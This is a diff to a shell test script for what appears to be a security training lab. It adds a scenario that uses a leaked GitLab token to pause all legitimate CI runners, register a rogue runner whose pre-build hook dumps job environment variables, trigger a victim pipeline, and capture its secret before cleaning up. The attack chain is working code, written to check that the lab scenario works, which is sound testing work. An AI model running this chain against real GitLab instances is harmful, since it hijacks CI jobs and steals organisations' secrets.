@@ -430,6 +430,33 @@ YML
   chk pbac_3 pbac_3-branch-protection-bypass "$out"
 fi
 
+# --- pbac_2: leaked token -> register a rogue runner that steals a victim job's CI secret ----
+if enabled pbac_2; then
+  GL=http://gitlab
+  PAT=$(on runner "sed -n 's/GITLAB_PAT=//p' /opt/leaked-gitlab.pat 2>/dev/null")
+  if [ -n "$PAT" ]; then
+    PID=$(curl -s -H "PRIVATE-TOKEN: $PAT" "$GL/api/v4/projects?search=payments" | jq -r '.[0].id')
+    # pause every currently-registered runner so the rogue one wins the job
+    RIDS=$(curl -s -H "PRIVATE-TOKEN: $PAT" "$GL/api/v4/runners/all?per_page=100" | jq -r '.[].id')
+    for r in $RIDS; do curl -s -H "PRIVATE-TOKEN: $PAT" -X PUT "$GL/api/v4/runners/$r" -d paused=true >/dev/null 2>&1; done
+    RT=$(curl -s -H "PRIVATE-TOKEN: $PAT" -X POST "$GL/api/v4/user/runners" -d runner_type=instance_type -d description=rogue -d tag_list=shell,host -d run_untagged=true | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
+    rsx runner root <<EOF
+rm -f /tmp/pbac2-proof; rm -rf /tmp/rogue; mkdir -p /tmp/rogue
+gitlab-runner register --config /tmp/rogue/config.toml --non-interactive --url http://gitlab.minilab2.lab --token '$RT' --executor shell --description rogue >/dev/null 2>&1
+sed -i '/executor = "shell"/a pre_build_script = "env > /tmp/pbac2-proof"' /tmp/rogue/config.toml
+setsid gitlab-runner run --config /tmp/rogue/config.toml >/tmp/rogue/run.log 2>&1 < /dev/null &
+echo \$! > /tmp/rogue/pid
+EOF
+    sleep 6
+    curl -s -H "PRIVATE-TOKEN: $PAT" -X POST "$GL/api/v4/projects/$PID/pipeline" -d ref=main >/dev/null 2>&1
+    out=$(on runner 'for i in $(seq 1 60); do grep -q "VICTIM_SECRET=MINILAB" /tmp/pbac2-proof 2>/dev/null && break; sleep 3; done; sed -n "s/VICTIM_SECRET=//p" /tmp/pbac2-proof 2>/dev/null')
+    # cleanup: stop rogue, unregister it, unpause legit runners
+    on runner 'kill $(cat /tmp/rogue/pid) 2>/dev/null; gitlab-runner unregister --all-runners --config /tmp/rogue/config.toml >/dev/null 2>&1; rm -rf /tmp/rogue' >/dev/null 2>&1
+    for r in $RIDS; do curl -s -H "PRIVATE-TOKEN: $PAT" -X PUT "$GL/api/v4/runners/$r" -d paused=false >/dev/null 2>&1; done
+    chk pbac_2 pbac_2-rogue-runner "$out"
+  else no pbac_2 "no leaked token on runner"; fi
+fi
+
 echo
 printf '### playthrough: %d passed, %d failed ###\n' "$PASS" "$FAIL"
 [ "$FAIL" -gt 0 ] && echo "FAILED: ${FAILED[*]}"
